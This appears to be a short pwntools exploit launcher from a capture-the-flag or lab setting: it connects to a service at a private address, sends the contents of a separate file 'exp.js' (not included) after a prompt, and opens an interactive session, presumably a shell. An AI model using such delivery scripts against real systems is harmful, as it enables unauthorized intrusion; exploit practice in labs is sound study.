from pwn import *

r = remote("172.17.0.3", 9999)

data = open('exp.js', 'rb').read() + b'\n-- EOF --\n'

r.sendafter(b':', data)

r.interactive()
